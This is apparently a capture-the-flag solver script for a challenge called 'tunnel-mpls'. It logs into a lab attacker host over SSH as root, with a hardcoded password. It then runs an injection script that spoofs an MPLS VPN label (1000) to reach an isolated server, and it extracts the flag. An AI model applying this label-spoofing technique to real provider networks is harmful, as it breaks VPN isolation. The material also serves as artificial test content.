#!/usr/bin/env python3
"""Solveur tunnel-mpls (label spoofing MPLS).

Depuis l'attaquant (SSH), on exploite le fait que le PE2 fait confiance aux
paquets deja etiquetes recus sur le lien de coeur : on injecte un paquet avec
le label VPN de CLIENT-C (= 1000, obtenu dans le defi 'etiquettes') vers le
serveur interne isole, en se faisant passer pour le site 1 ; la reponse repart
labellisee sur le segment et on la sniffe.
"""
import re
import sys

import paramiko

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 1346
LABEL = sys.argv[3] if len(sys.argv) > 3 else "1000"


def main():
    c = paramiko.SSHClient()
    c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    c.connect(HOST, port=PORT, username="root", password="MplsSpoof2026")
    _, out, err = c.exec_command(f"python3 /root/inject.py {LABEL}")
    output = out.read().decode() + err.read().decode()
    c.close()
    m = re.search(r"FPS\{[^}]+\}", output)
    print(m.group(0) if m else "echec:\n" + output)


if __name__ == "__main__":
    main()
